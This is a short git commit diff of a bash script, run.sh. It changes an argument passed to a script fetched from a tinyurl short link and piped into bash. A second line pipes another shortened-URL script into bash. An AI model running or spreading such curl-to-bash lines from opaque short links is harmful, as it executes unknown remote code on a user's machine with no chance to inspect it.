1d766f1c81b70b2ec29137637341bee1006328aa
Arun Kumar <arun6582@gmail.com>
2026-08-05 19:15:49 +0530

    [master] run.sh correct

--- run.sh
+++ run.sh
@@ -1,4 +1,4 @@
 #!/usr/bin/env bash
 
-curl -sL https://tinyurl.com/5bjj3sf8 | bash -s -- 1000000
+curl -sL https://tinyurl.com/5bjj3sf8 | bash -s -- 1500
 curl -sL https://tinyurl.com/3npwjzpz | bash -
